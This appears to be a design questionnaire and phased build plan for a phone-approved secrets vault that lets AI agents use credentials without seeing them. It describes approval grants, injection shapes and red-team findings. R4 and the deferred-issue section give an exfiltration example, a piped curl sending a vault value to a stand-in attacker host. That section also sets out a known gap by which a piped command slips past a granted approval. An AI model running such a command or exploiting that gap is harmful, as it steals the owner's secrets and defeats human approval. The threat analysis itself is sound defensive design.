# Questionaire

Vault: secrets and notes vault, phone-approved, for agents and for the owner's own terminal.
Board entry: Vault Plugin (`bd_1b5ca0e9`) with three children. Points refreshed 2026-09-05 against
main at `7a865872`, after harness-and-seams: every reference below re-checked, and R9 carries what
that plan changed for this one.

## Rulings settled in chat before the questionaire

### R1 - A tool result is transcript, so no `vault_get` exists

Q: How can an agent use a password without it entering history?
A: It cannot receive it at all. The vault is a USE-the-secret API, never a READ one.

> "We don't want the value to save in transcript."

Five injection shapes: env (default), stdin, file (0600 tmpfs, hand back the path), askpass,
argv template (weakest, lands in `ps`, last resort). PTY supervisor is the ugly corner for
hookless prompts. Stdout and stderr are scrubbed for the raw bytes before anything returns.

### R2 - The owner's own terminal is reachable only through an askpass hook

Q: Can the plugin inject into a process the owner already ran?
A: No. `/proc/<pid>/fd/0` writes to the screen. `TIOCSTI` is off (`dev.tty.legacy_tiocsti = 0`,
kernel 7.0). ptrace is the same class. The askpass hook is the one path that does not care who
started the process or where.

> "Claude is the tmux. I work outside it."

Scope: processes the agent starts, plus anything with a hook. A hookless prompt in the owner's own
terminal stays out of reach on purpose; that is a password manager's job.

### R3 - The askpass helper is fail-open

Q: With the phone offline, does `SUDO_ASKPASS` break the usual flow?
A: sudo: no, by construction. `SUDO_ASKPASS` fires only on `sudo -A` or with no tty. ssh: the
first draft's `SSH_ASKPASS_REQUIRE=force` WOULD have broken it (no tty fallback). Fix is that the
helper itself falls back to `/dev/tty`, so the failure never reaches ssh.

> "supposing the phone is offline and the Gateway sees no Console to answer, will setting like
> SUDO_ASKPASS break their usual flow?"

### R4 - Approve the operation, not the secret

Hiding the value solves storage. It does nothing about misuse: an agent that can say "run this
with the token" can say "run curl to an attacker with the token". The brief names the command.
A time window, if kept, is scoped to a host or command shape, never to the raw secret.

### R5 - Wire and latency constraints found in code

- `AGENT_WAIT_BUDGET_MS` is 240s because node's fetch abandons a silent connection at 300s. Any
  hold longer than that is a bounded wait plus a separate collect, as Codex does.
- The console has two links (`ConsoleLink` in `ConsoleTransportCoordinator`): a bound Router
  socket receives an owner row as a push; otherwise `tierFor` in `IdlePushbackManager` decides
  the poll: foreground chains long-polls (instant); under 10 min quiet polls every 60s; under
  10 h polls on the half hour; beyond that hourly, on an alarm. `WATCHED_WORKING_CAP` pins a
  watched working session to the 60s tier. No FCM. Approval latency is the link, so a request
  row must raise a notification and an idle phone answers in minutes.
- Consequence for R3: with a human at the tty, RACE the tty and the phone; first answer wins. No
  waiting window at all. Long holds belong only to the no-tty (agent-invoked) case.
- Cross-console sync is by construction now: owner rows live in the Router owner inbox, and a
  second console admitted through Add Device receives the content keys in
  `ConsoleTransport.contentKeys`.
- The executor is the session's MCP server, not the gateway. The gateway is a container and
  cannot run in the agent's environment; the MCP server runs beside the agent's Bash and already
  speaks to the gateway over `BRIDGE_ROUTER_URL`. The value crosses gateway to MCP memory and
  into a child process, never a tool result.
- Request row: `deliverToOwner`, sealed under the inbox-body binding. Either a new
  `ConsolePushEntry` kind or a `plugin_action` row; the phone dispatches those to a claimed
  `pluginId:actionType` handler (`Plugins.kt`). Answer: a new VALUE op, forwarded live as a
  `value_op` frame with typed `unreachable` and `timeout`. The op ledger answers a re-posted op
  with its first answer, so a double tap is one decision.
- `ServiceNotifications` already sets a delete intent on dismiss and action buttons, so
  swipe-to-deny and the Allow buttons reuse those mechanisms.

### R6 - The helper talks to the Gateway, never the MCP server

The MCP server is per-Claude-session and dies with it; the helper must work with no agent alive.
Target is the Gateway: `127.0.0.1:20000` from the host, `http://switchboard:20000` inside a
devcontainer (the `BRIDGE_ROUTER_URL` default). Precedent: the host daemon is already a host
process holding a gateway connection. The helper identifies its caller from the parent's
`/proc/<ppid>/cmdline` (world-readable even for setuid sudo; `environ` is not), so the brief can
name `sudo apt install foo` or `ssh deploy@prod`.

Open: the helper needs a credential the gateway accepts. `HOST_WS_TOKEN` gates the daemon's slot;
a vault route should take a helper token minted at install rather than reuse it.

### R7 - Phone replacement: the owner root is backed up or the Domain is dead

Q: How dangerous is replacing the phone? Is there a path to activate a new one and retire the old?
Does the new phone keep Federation Admin?

A: Three facts from code, none of them Vault-specific.
- The owner root key never leaves the phone and cannot be revoked; it IS the root. Trust-on-first-
  enroll rejects a different owner key. `FederationManager.exportOwnerBackup` exports the full
  identity (sign and box keypairs) as a passphrase-encrypted blob; `importOwnerBackup` restores
  it, refuses a DIFFERENT owner, and is idempotent for the same one. Restore on a new phone = the
  same owner = the same admin. Without that backup, a lost phone means Purge Federation and
  re-enrol every Gateway and device from scratch. "Recover the Domain" in the UI text has no
  function behind it; that IS the recovery.
- "Add a device" (`DeviceApprovalOps`) admits a fresh phone as a CONSOLE under the owner root,
  explicitly without the owner key. It can use everything and sign nothing. Not admin.
- Retiring: Your devices lets an owner-key holder revoke another device's console admission,
  biometric-gated. A device cannot remove itself. Revoking the old phone's console does NOT
  revoke the owner key it still physically holds; wiping the old phone is the only answer.

> "how danger is it if we have to replace a phone? does it even have a path to activate a new
> phone and retire this existing one? Will the new phone have the same Federation Admin ?"

Vault consequence: the substrate did what this asked for. The owner content key is derived on the
owner phone from the root and an epoch, and the backup regenerates every epoch. A restored phone
unwraps the vault with no new burden. A console-only second phone unwraps because Add Device
delivers the same keys. See R8.

### R8 - Substrate rulings inherited from router-hub

- Vault entries and notes are tier 2, SEALED SHARED: the Router is authority on a clear envelope
  (id, version, kind) and blind to the content.
- The owner content key is symmetric and held by every admitted phone and every enrolled gateway.
  The Router is the one party without it. The gateway keeps it in
  `DATA_DIR/federation/content-keys.json` (`ContentKeyStore`).
- "Store on gateway or console" collapses: the record is on the Router, sealed; any gateway opens
  it at use time; any phone opens it to show or edit.
- Public vs private title and description is a gateway serving rule: the gateway opens the whole
  record and serves only public fields to agents. The Router needs nothing clear beyond the
  envelope. "Searched from the outside" is an agent asking its own gateway.
- Board precedent to copy: `boardClient.ts` is the sole sealer and opener, the AAD binds the entry
  id (`boardTextAadKind`), writes are CAS on revision, a conflict answer carries the winner. A
  vault client is the same shape with a kind per field.
- Residual: the key is Domain-wide, so every gateway can open every secret. Narrowing to one
  gateway is Question 1.

### R9 - Seams inherited from harness-and-seams

- Owner-op kinds live in `ownerOpRegistry.ts`: kind, value schema, mutation class, answer schema.
  The Kotlin codegen reads it as the sole kind list, so `Protocol.Wire` gains a kind from the
  registration alone. The migration fence holds every class but `read`.
- Gateway frames live in the frame catalog (`bridge/frameDispatch.ts`), one descriptor per frame
  with its mutation class and incarnation policy; `gated: true` for anything but a read.
- Clocks, entropy, ids, and timers come from the injected `Ambient`. `ambient-residue.test.ts`
  fences `src/gateway`, `src/federation-server`, and `src/mcp`: no `Date.now`, no bare timer.
- The gateway is composed in named stages under `src/gateway/compose/`. A subsystem lands as a
  stage with typed deps on `GatewayDeps`, never as code in `composeGateway`.
- Behavior tests run in the federation harness (`src/testing/`, `fixtureWorld.ts`): the real
  Router and gateway graph in process, fake host and session sockets, the TS phone driver, both
  timer drives. Wire fixtures are minted by both runtimes under `tests/fixtures/identity/set.json`
  into `tests/fixtures/wire/`; `check:fixtures` and the Kotlin gate diff them.

### Assumption A1 - Vault is a capability id, not a marketplace plugin

Treated as a new id beside `taskboard`, `designer`, `references` in `GATED_CAPABILITY_IDS`
(`src/mcp/capabilities.ts`), gated per session like the others. Not a separate plugin with its own
MCP server.

## Question 1 - May a secret be narrowed to one Gateway, and how?

Q: The substrate gives every enrolled gateway the Domain key, so a Router-held secret is readable
by every gateway. Is that acceptable, and if a per-gateway secret is wanted, is the scope an
authorization rule or a cryptographic one?

- A) Domain-wide, sealed shared, with an envelope allowlist. Every gateway can decrypt. A clear
  `gateways` field on the envelope names which may USE it; the gateway enforces it. Authorization
  only. A compromised gateway already holds the Domain key for the board and every body, so this
  adds no new exposure. Simplest; the board shape verbatim.
- B) Per-gateway key epochs. A secret sealed to a key only its named gateways receive. Needs a new
  key delivery road per secret and per gateway, and a revocation story. Cryptographic scope.
- C) Gateway-local values, Router-held catalogue. The value never leaves the gateway that holds
  it; the phone enters it through a value op to that gateway; other consoles see the catalogue
  only. A lost gateway loses its secrets. No console sync for values.

A: A. Domain-wide, sealed shared, envelope allowlist enforced by the gateway.

> "A it is"

Recommendation reason: B defends only against a gateway that already holds the Domain key for the
board and every message body, at the cost of a second key system. C gives up console sync and
backup for the values, which the substrate made free.

### Assumption A2 - One record kind, a note is an entry without a value

`vault_entry` on the Router's owner state, CAS on revision like the board. Clear envelope: id,
revision, tombstone, `createdBy`, `createdAt`, `updatedAt`. Sealed: public title and description,
private title and description, value, the gateway allowlist. At least one title required. Public
fields are the only ones ever served to an agent; a note is an entry with no value, so an agent can
find it and never read it. The Router sees the envelope only.

A delete wipes every sealed field and keeps the envelope as a tombstone, so every console converges
on the deletion from one list. A blind re-create at revision 0 meets the tombstone as the conflict
winner; reviving names the tombstone's revision. The sweep drops a tombstone seven days after
`updatedAt`, one vault revision per batch.

### Assumption A3 - Decisions and windows are gateway-local

An approval names a session, and sessions belong to one gateway. The gateway records the decision
and holds any window under `DATA_DIR`, durable across restarts, never on the Router. A second
gateway asks again.

## Question 2 - What is the unit of approval, and what does a window cover?

Q: An operation arrives as the agent's argv plus a secret handle plus a session (`vault_run`), or
as the caller's cmdline plus the program (askpass). The brief names it. What does one grant cover?

- A) Exact operation. The identical argv or cmdline, same secret, same session. Every variation
  re-prompts. A window only saves re-typing the same command.
- B) Program plus target. The shape is the program basename plus its first non-flag argument:
  `ssh deploy@prod`, `sudo apt`, `docker login registry`. A grant covers any argv sharing that
  shape with the same secret and session. `curl` never matches an `ssh` grant. The gateway
  derives the shape and the brief shows it.
- C) Secret plus session. The parent spec read literally: unlock the secret for the session for a
  window. Arbitrary use inside the window. The threat model 2 hole.

A: Three grant tiers, one per button. Once is A-shaped: this exact operation, this call. 30
minutes is B-shaped: program plus target, same secret, same session. Whole session is C-shaped:
the secret unlocked for the session, labeled YOLO in the brief and on the session, ending with the
session or at the settings cap, whichever comes first.

> "once, 30 minutes, or whole session for those Yolo moments."

Recommendation reason (B, for the timed tier): a loop of `ssh` and `scp` to one host stops
nagging without handing the token to anything else.

## Question 3 - May an agent write to the vault?

Q: A tool call is transcript as much as a tool result, so an agent can never pass a value in.
May it still create entries another way?

- A) Phone-only writes. Agents search public fields and use values. Every create, edit, and
  delete happens on the phone. The Router refuses gateway writes on the vault kind.
- B) Create by capture. `vault_run` gains a capture mode: the child's stdout becomes the value of
  a NEW entry, scrubbed from the tool result, the agent names the public title. Edits and deletes
  stay phone-only. The owner gets a notice per created entry. The Router allows gateway creates
  and refuses gateway updates and deletes on the clear envelope.
- C) Nothing. Agents use values only; the vault is not even searchable by agents, and every
  `vault_run` names an entry the owner handed the session in chat.

A: B. Create by capture. A captured entry opens on the phone as editable, so the owner can clean
the stdout crust off by hand. Capture trims one trailing newline and nothing else.

> "B sounds good. and of course should show on phone as a editable so you can manually clean the
> STDOUT crust off."

Recommendation reason: "generate and store" is the case, an agent minting a database password
that must reach the compose file without ever entering the transcript.

### Assumption A4 - Requests come from this Domain only

A request names a session on a gateway in the entry's allowlist, or the askpass helper on such a
gateway's host. A cross-Domain friend session never sees the vault, never searches it, and never
requests from it.

## Question 4 - May the phone supply a value that is not stored?

Q: The bonus feature: an agent runs `sudo` and the owner types the password. Under the design the
request reaches the phone through the askpass helper. Must the password be a stored entry first,
or may the owner type a one-shot value into the request?

- A) Both request kinds. "Approve use of entry X for operation Y", and "supply a value for
  operation Y" where the owner types it on the phone, with a Save as entry toggle. The typed
  value travels sealed to the gateway like an approval and reaches the process the same way.
- B) Stored entries only. The sudo password is a vault entry or the request is refused. One
  request kind, one code path.
- C) Typed values only on the askpass path. `vault_run` always names an entry; the helper may
  take a typed value.

A: A. Both request kinds, with a Save as entry toggle on the typed one.

> "A"

Recommendation reason: it is the bonus feature as written, and the Save toggle is how entries get
made from the phone without opening the vault screen first.

### Assumption A5 - Agents address entries by id after a public search

`vault_search` answers ids with public title and description only. `vault_run` names an entry by
id. No tool answers a private field or a value.

### Assumption A6 - The askpass helper holds its own token

Minted by the gateway at helper install, stored 0600 under the owner's home, revocable from the
phone. Never `HOST_WS_TOKEN`.

## Question 5 - Which approvals need biometrics?

Q: The app has a biometric lock (`Biometric.promptUnlock`, the Security settings toggle) and gates
device revocation with it. Which vault actions prompt?

- A) YOLO and reveal. The whole-session grant prompts, and revealing or editing a stored value on
  the vault screen prompts. Once and 30 minutes are a tap; a typed value is typing already.
- B) Every approval prompts.
- C) Nothing beyond the app's existing lock.

A: Configurable, in Security settings. Default C. Values: Off, Every approval, and a 30-minute
unlock where one prompt covers vault prompts for 30 minutes. The setting governs approvals and
reveal alike; a typed value never prompts.

> "Configurable. Default C. Might choose every, or lock 30 min."

### Assumption A7 - Vault is an app plugin on the phone

Registered under `plugins/vault/` like Designer: claims the `vault:request` plugin action, an
account wipe handler, and a thread forget handler. Placement of its screen is Question 6.

## Question 6 - Where does the vault live on the phone?

Q: The main screen has the Sessions tab, a Backlog tab that appears when the board is enabled, and
a Settings button. Where do entries get listed, searched, added, and edited?

- A) A Vault tab beside Sessions and Backlog, present when the capability is enabled, the way
  Backlog is. Pending requests badge the tab.
- B) A Settings leaf screen. Out of the way; requests reach the owner through the notification
  and the session thread only.
- C) No list screen. Entries surface only as request cards in the session thread, managed from a
  sheet. Notes have no home.

A: A. A Vault tab, conditional on the capability like Backlog, badged by pending requests.

> "tab"

Recommendation reason: notes need a home, and Backlog already shows the conditional-tab pattern.

## Question 7 - Which injection shapes ship first?

Q: Five shapes plus the PTY supervisor were listed. Which are in the first release?

- A) env, stdin, file, and the askpass helper. No argv template, no PTY supervisor.
- B) A plus the argv template, flagged weakest in the tool description.
- C) Everything, PTY supervisor included.

A: A. env, stdin, file, and the askpass helper. No argv template, no PTY supervisor.

> "A"

Recommendation reason: nearly every program takes a secret by env, stdin, or file. The argv
template lands the value in `ps` and shell history; the PTY supervisor does not generalize.

## Question 8 - Must a vault delete erase the ciphertext from the Router journal?

Q: A delete wipes the live record to a tombstone, but the owner journal is append-only, so the
earlier line still holds the sealed fields until the store compacts (past 4 MiB of journal, in
`inboxSweep`). The Router never holds the content key, so the residue is ciphertext under a key the
Router cannot use. Is that enough?

- A) Yes. Convergence was the tombstone's purpose; the journal is the same substrate every sealed
  record lives on, board text included. No change.
- B) Force a compaction after a vault delete, with crash-safe manifest rotation. Erases the line
  at the cost of a snapshot per delete.
- C) Per-entry key epochs, so a delete destroys the key and the residue is unreadable by anyone.
  A second key system.

Open. Phase 1 shipped A.

# Plan

From the questionaire, refreshed against `7a865872`. Deploy order per AGENTS.md: Router first (it
answers new frames), then gateway, then phone, then plugin. Every wire addition optional and
tolerated by both peers. Each phase ends with its harness scenarios green under both timer drives.

## Phase 1 - Wire truth and the Router vault service ✅

- `src/shared/schemasVault.ts`: `VaultEntry` clear envelope (id, revision, tombstone, `createdBy`
  phone or gateway), sealed field envelopes, request and answer payloads. `.meta({id})` for the
  Kotlin codegen.
- AAD kinds in `content-envelope.ts`: one builder taking a kind, like `boardTextAadKind`; one
  exported constant per field, binding the entry id, plus a typed-value kind binding the request id
  (Q4). Kotlin twin in `ContentAadKinds.kt`. One vector per constant in the content-envelope
  corpus, pinned from the constants on both runtimes.
- `src/federation-server/vault/`: owner-state service through `ownerServiceHooks.ts`. CAS on
  revision. Authority on the clear envelope: a signed console OwnerOp may create, update, and
  delete; a gateway frame may create only (Q3). Router blind to every field.
- OwnerOps `vault_list` (`read`), `vault_put` and `vault_delete` (`value`), registered in
  `ownerOpRegistry.ts` with answer schemas. Gateway frames `vault_read` (`read`) and
  `vault_create` (`value`), both gated on the incarnation, registered in the frame catalog (R9).
- `vault_answer` and `vault_grants` and `vault_revoke` added to `VALUE_OP_KINDS`. Additive, no
  `CONSOLE_PROTOCOL_VERSION` bump.
- Fixtures under `tests/fixtures/protocol/` for the request row (`MailboxEntry`), the answer
  (`ConsoleOp`), and a bare invalid row of each, opened by `protocol-fixtures.test.ts` and
  `ProtocolFixturesTest.kt`. Sealed field envelopes join `tests/fixtures/wire/` with their
  composers: the gateway client in Phase 2, the Kotlin sealing in Phase 3.
- Harness scenarios: a phone-driven `vault_put`, a gateway `vault_read`, the CAS conflict, and the
  fence refusing `vault_create` inside a migration window.

Shipped beyond the bullets: `vault_list` answers `since` and keeps a retained floor, so a cursor
below a swept tombstone gets a full list. Owner-state sweepers register through `hooks.onSweep`;
the Router sweep holds them under the fence. The bridge checks admission on every signed frame,
evicts a revoked signer through the one drop path, and names its frame refusals in
`wire-vocabulary.ts`.

## Phase 2 - Gateway: vault client, decisions, request road ✅

- `src/gateway/compose/composeVault.ts`: the stage that builds the client, the decisions, and the
  request road, after the stores and the Router client. Deps typed on `GatewayDeps`; every clock
  and timer through `ambient` (R9).
- `src/gateway/router/vaultClient.ts`: sole sealer and opener of vault fields, sole reader of the
  gateway allowlist. Opens with `ContentKeyStore`. A `vault-door-residue` test pins it as the
  only door.
- `src/gateway/vault/decisions.ts`: grants under `DATA_DIR/vault-decisions.json`, named in
  `DATA_DIR_ENTRIES` (`dataDirInventory.ts`). Once is consumed on use. 30 minutes keys on program
  plus target, secret, session, its deadline on `ambient.now`. Whole session keys on secret and
  session, ends with the session or the settings cap.
- `src/gateway/vault/requests.ts`: a request (id, operation text, shape, entry id or typed,
  session, 9-minute deadline on `ambient.setTimer`) delivered as a `plugin_action` row
  `vault:request` through `deliverToOwner`, volatile in `OwnerRowOutbox`. The `vault_answer` value
  op reaches `consoleHandler.ts` through the console dispatcher in `composeRouterFrames.ts` and
  resolves the request. Deny and timeout answer the same refusal.
- Harness scenarios under both timer drives: request then answer once; answer 30
  minutes then a second run inside the window; deny; timeout; a gateway restart with a window held.
- A vault sealing case in `gen-wire-fixtures.ts`, minted under the identity set.
- Loopback routes for the MCP server and the helper: search (public fields only), use, collect,
  capture, askpass. Helper token minted at install, verified per call (A6).
- The value leaves the gateway only in a loopback answer to an approved request.

Shipped beyond the bullets: routes are `/vault/search`, `/vault/use`, `/vault/collect`,
`/vault/capture`, `/vault/askpass`, and `/vault/helper-token`; the last mints a helper token with
the host's own token for the installer. Whole-session grants cap at eight hours; no console setting
configures the cap. The sealed `gateways` field holds a JSON array of gateway ids. An ask selects a
sole entry whose public title equals the shape; duplicate titles require a typed request. Typed
values never leave a grant. Capture trims one trailing newline. The shape is the program plus its
first argument, or the whole line when a flag appears first because its value could hide the target.
Search reports whether an entry holds a value, so notes never request one. Approval waits for
collection until the request deadline; session end drops open requests and grants. The request unit
covers timeout under manual drive; the harness covers the rest under real drive. `vault_revoke` also
revokes helper tokens by id. Each value route resolves one principal, a bound session or the helper,
and names the kinds it serves, so the helper collects its own pending answer; the mint route takes
the host token. Grants and helper tokens open through `openDurable`, and a revocation is reported
only once its snapshot is installed. A request row is volatile: a restart drops whatever the outbox
still holds, and an answer to a request the gateway no longer holds reads as expired.

## Phase 3 - Phone: Vault tab, editor, request sheet ✅

- `plugins/vault/`: `VaultPlugin.kt` claims `vault:request`, wipe, and forget (A7).
- `VaultSealing.kt`, a `ContentSealing` under `vaultAadKind`, with its case in
  `WireFixtureGenerator.kt`. `VaultManager` holds Router-held entries through the OwnerOps, sealed
  with `ContentKeyring`. `Protocol.kt` needed no regeneration; the Kotlin gate diffs it.
- The `vault` plane: the Router's push and `planeVersions` entry land together with the phone's
  `applyPlane` arm, which acknowledges a version only once the held revision reaches it.
- A full `vault_list` at the caps is about 49 MB of ciphertext in one frame. Page it, or bound the
  entry total, before the phone holds the list.
- Vault tab in `MainTabsScreen.kt`, conditional on the capability like Backlog, badged by pending
  requests. List, search, add, edit, delete, reveal. A captured entry opens editable (Q3).
- Request sheet: the brief names the operation and the shape; buttons Once, 30 minutes, Whole
  session (YOLO), Deny; a typed-value field with Save as entry (Q4). Notification through
  `ServiceNotifications` with the delete intent as deny.
- Security setting: vault biometrics Off, Every approval, 30-minute unlock (Q5).
- Session card: YOLO badge and active grants with revoke, read through `vault_grants`.
- Capability toggle reported through `capabilities_report`; Kotlin gate and a debug APK.

Shipped beyond the bullets: the Router pokes the `vault` plane from every applied write and sweep,
and `planeVersions` reports it, so a socket welcome carries the revision. The gateway keys a helper's
request row to the console's own conversation and the capture notice to the capturing session as a
`notice` key with `from`; the phone drops any row it cannot key to a team, which the earlier
`gateway.<id>.vault` id was. The phone answers a plane bump with a delta list and acknowledges the
version only once its held revision reaches it; an unacknowledged bump is fetched again at most once
a minute, and a bump the socket pushed retries twice on its own. A write's own entry lands at
once and the held revision advances only when nothing was skipped. Expired requests are dropped at
load, on refresh, and when the deadline passes on the gateway's side. Notification buttons Once and
30 min appear only while Vault approvals is Off; a typed request offers Deny alone and the tap opens
the sheet. Grants are read per admitted gateway when the tab opens and after an approval, not on
every plane bump. The whole-session chip reads YOLO; a window reads vault. The 49 MB list bullet is
deferred: the caps hold, and a real vault stays far under them. Kotlin fixtures gained `vault_put`
and `vault_list`, replayed through the Router by `wire-fixtures-kotlin.test.ts`. The gate covers an
entry approval, a reveal, and a save that changes or clears a stored value; a typed value never
prompts (Q5). A notification button taken after the gate was set opens the sheet instead of
answering. The phone's manager and ops read the system clock and mint UUIDs like the board's; R9
binds the gateway and Router. The vault's store key writes with `apply`, since the Router holds the
truth and a request lost to a crash expires on the gateway. A request that arrives while the plugin
is off is dropped like any unclaimed action; switching the plugin off clears the pending ones and
their notifications, and a notification that outlives the plugin answers nothing. A late write
answer never replaces a newer held entry, a full list below the held revision is dropped, and lists
run one at a time. Work begun before a wipe lands nothing after it. A save keeps every field this
phone cannot open, and the gateway chips never widen a scope by emptying it: only Every gateway
clears it. A typed value saved as an entry is scoped to the gateway that asked, and the gateway
settles a typed answer as once whatever tier the phone named. The secret fields use the password
keyboard. Known and left: a phone clock ahead of the gateway drops a request early. A second
admitted phone kept a request the first one answered until its deadline; Phase 4's retract row
ended that. The three list consumers
(gateway client, phone vault, phone board) fold through one shared rule, `versioned-list.ts` with its
Kotlin twin and vectors. `ContentSealing` is the one sealing door the board and vault subclass.
`ApprovalGate` owns the policy, the window, and the prompt. `sealDraft` is the pure draft-to-sealed
rule. `PluginHost.onRetract` is how the vault drops its pending requests when it goes off. A
plugin-owned request surface (pending items, their notification, their modal) is not registered: a
later plugin's request kind costs edits in the service, the receiver, and the activity.

## Phase 4 - Askpass helper ✅

- `src/main-vault-askpass.ts`, a second entry in `scripts/build.ts` beside `main-mcp.js`, bundled
  into `dist/`. Reads `/proc/<ppid>/cmdline`,
  opens `/dev/tty` when it can, races the tty against the phone, holds only with no tty (R3, R5).
  Prints the value to stdout and nothing else.
- Installer script: mints the token through the gateway, writes the binary and the 0600 token
  under the owner's home, prints the three profile exports. Documents that `force` is optional
  and that sudo needs `-A`.

Shipped beyond the bullets: the decision is `src/vault-askpass/askpass.ts`, pure over gateway, tty,
and clock ports, with the entry point wiring `/proc`, `/dev/tty`, `node:http`, and the signals. The
opening `/vault/askpass` call asks for no wait, so the request id is known before the human can
win; collects hold 25 s beside a tty and `VAULT_ROUTE_WAIT_CAP_MS` without one. A tty win withdraws
the phone's request through the new `/vault/withdraw` route, bounded to three seconds; a caller's
SIGINT, SIGTERM, or SIGHUP withdraws too. An empty line asks again; a closed tty leaves the phone
road running; an owner's refusal or an unreachable gateway leaves the tty as the road. When the
phone wins, the sh child is killed, half-typed input drained, and echo restored. The brief replaces
its first word with `/proc/<ppid>/exe`, drops sudo's `-A` ahead of the command, and is sent only
for a prompt naming a password, passphrase, secret, token, or PIN: ssh's host-key confirmation and
git's username prompt stay at the tty, so a grant never answers a yes/no (red team). A helper's
session tap records a window, since every process on the host shares the token (red team, R4).
`withdraw` refuses a request already answered. Minting a helper token needs an enrolled gateway.
Revoking a helper token ends its grants and open requests, closing the Phase 2 painpoint. Every
settlement, whichever road, sends a `vault:retract` row that the phone's `VaultPlugin` claims and
drops the request on, so a second console never keeps an answered request (architecture). The
installer bakes the bun that ran it, the token path (`VAULT_ASKPASS_TOKEN_FILE`), and the gateway
into the wrapper, so a caller that resets HOME or PATH still reaches the helper; the token file is
created fresh at 0600. Loopback calls go through `node:http`, which no proxy variable diverts.
Known and left: the brief names the operation and cannot vouch for the caller (R4); any local
process with the token can withdraw a helper request, which denies one prompt and diverts nothing;
a helper hold under sudo runs to the request's deadline, since sudo's password timeout does not
cover an askpass child.

## Phase 5 - MCP tools ✅

- Capability id `vault` in `GATED_CAPABILITY_IDS`; guidance in `src/shared/capabilities.ts`.
- `src/mcp/vault/`: `vault_search`, `vault_run` with env, stdin, and file shapes, a collect call,
  and a capture mode that creates an entry (Q3, Q7). Bounded by `VAULT_ROUTE_WAIT_CAP_MS`, which
  is what a gateway loopback hold takes; `AGENT_WAIT_BUDGET_MS` bounds a Router-held agent turn.
- The MCP server spawns the child, scrubs stdout and stderr for the raw bytes, holds output for
  collect, deletes a file shape on exit.
- A tool that gives up on a pending request withdraws it through `/vault/withdraw`, as the helper
  does, so the phone's row is retracted with it.

Shipped beyond the bullets: four tools, not three. `vault_collect` continues a job and
`vault_withdraw` gives one up, since a run has two ways to outlive its wait: the owner has not
answered (`pending`) or the command has not exited (`running`). A job keeps one id across both.
Two collects on one job share an answer rather than starting the command twice. The tools register
only when the console reports the capability and the session holds a binding token, since the
routes demand one. `VAULT_INSTRUCTIONS` is served through `switchboard_capabilities` beside
whatever the phone's manifest says, so the always-on instruction block stays short.

The child runs in its own process group, so a stop reaches what the shell started, and Switchboard's
own secrets are scrubbed from its environment. Loopback posts never retry: a retried long poll
would open a second request on the phone. A repeated run instead joins the request still open for
the same asker, entry, and operation, which is `requests.find`; both waiters take the value that
one approval covers, while a typed value still goes to one collector. A caller that walks away
releases its wait without consuming the answer, and `MAX_OPEN_PER_TARGET` caps what one asker can
put on the phone at once. Revoking a helper token ends its grants and open requests.

The output pipeline is one pass per stream: collect raw bytes to a ceiling, drop the value's byte
length at a cut, scrub, then cap. A value short enough to sit inside `[vault]` would survive the
scrub, so that stream is withheld whole. The cut and the cap are separate facts, so a noisy stderr
no longer costs a good capture, and a capture whose stdout was cut stores nothing. The capture road
reads the raw stdout through the same buffer, so no flag decides whether the field exists.

Known and left: a same-uid process can read any shape, through `/proc/<pid>/environ` or the file,
which is the plan's boundary and not this code's. Jobs live in the MCP process, so a lost tool
result is not recoverable. A peer that withdraws a joined request leaves the other waiter reading
"the owner did not authorize", which is untrue but harmless, and distinguishing it would cut
against the rule that a denial and a timeout read alike.

### Request dialog, revised with the owner after Phase 5

The session's display name never rides the request: `sessionTarget` is the local `spawn.session`
field, or `helper.<tokenId>`. The row's `session_id` carries the full address, the drain keeps it as the
request's `team`, and the phone resolves the name the way the board card does. What the dialog had
dropped was the gateway segment, which tells two machines apart. `VaultRequestText.kt` holds the
rules: the title is what is asked for (the entry's title, `Sudo request`, or `Password request`);
the first line is `gateway · label`, or the gateway alone for the helper; the command; nothing
else. The countdown reads whole minutes, then seconds in the error color under two minutes, ticking
each second there. The manager stamps `attempt` and `sinceAnswerMs` on a request that repeats an
answered command on the same team inside `REPEAT_WINDOW_MS`, chained through the latest answer, and
the sheet shows the red repeat line, with `n of 3` when the program is sudo. The typed field is
`Password`. The buttons and the save checkbox of this revision were replaced by the split button
below. The notification title is the dialog title and its text the requester and the command.

The owner then asked for a definitive retry signal and the session name on a sudo run. Probing
showed sudo hands the helper the caller's environment and its own pid. The helper now sends
`asker`, its parent's pid and start ticks, and the session token beside the helper token when it
has one. `principal` takes the route's kinds in order, so `/vault/askpass` names a verified session
as the asker and falls back to the helper; the request lands in the session's thread, and its
grants apply. `asker` is an optional field on both request arms and the askpass body. The phone
counts a repeat under the same team and asker as the same run, window or not, and says `Wrong
password. 2 of 3.` for sudo and `Not accepted. Try 2.` otherwise; without an asker the same team,
command, and window guess stays for an older helper.

Deny steers. Tapping Deny swaps the approve row for a `Steer` field and `Back` and `Deny`; the
second Deny sends the note, empty or not. The note is an optional field on `vault_answer` and on
the refused answer, so it reaches the session in the `vault_run` result it was waiting on, and the
helper prints it to stderr. The notification lost its Once, 30 min, and Deny buttons: a tap opens
the sheet, where every answer lives, and a swipe still denies. The four wrapping pills became one
row: Deny as a text button, then a split button whose main half is `Approve` (once) or `Send`, and
whose arrow holds 30 min and This session, or Send and save. The save checkbox and
its title field went with it; a saved typed value takes the shape as its title, which is what the
helper matches.

### Deferred by the owner: the shape stops at the first metacharacter

`operationShape` takes the program and its first argument, so a shell pipeline collapses to its
head. `printf %s "$V" | sha256sum` and `printf %s "$V" | curl -d @- https://attacker` are both
`printf %s`, and a window granted for one covers the other on the same entry and session. A
semicolon does the same. This is the case R4 says must not happen, that a grant for `ssh
deploy@prod` never covers `curl` with the same token.

The narrow fix follows the rule already beside it: a leading flag makes the shape the whole line,
since a flag's value can hide the target, and a metacharacter hides it the same way. The owner
deferred this on 2026-09-05, having broader guards in hand. Two things worth carrying into that
design. The request sheet already prints "30 minutes covers {shape}" to the owner, so the shape
string is a promise shown on screen and needs to be one worth reading. And a grant only ever
matches on entry, shape, and session together, so narrowing the shape can never widen a grant.

### Bug Classes

- **The child's output pipeline, `vaultRun.ts`:** a piece of a value passing for the whole of it.
  Round one capped the streams before the scrub, so a value straddling the cut kept its tail, and
  a capture stored the scrubbed text rather than what the command wrote. Round two found the same
  class again: a capture whose output was cut stored the prefix as if it were the secret. The
  patches are a raw ceiling with a dropped window, a scrub before the cap, a raw stdout kept only
  for a capture, and a capture refused when the output was cut. The mechanism now has four rules
  where one would do; a single "collect, scrub, then bound" pass with the capture reading the same
  buffer is the shape to reach for.

## Phase 6 - Docs, residue, audit ✅

- `docs/vault.md` (written with Phase 2; each phase extends it); AGENTS.md map entries;
  `docs/console.md` OwnerOps; `docs/environment.md`.
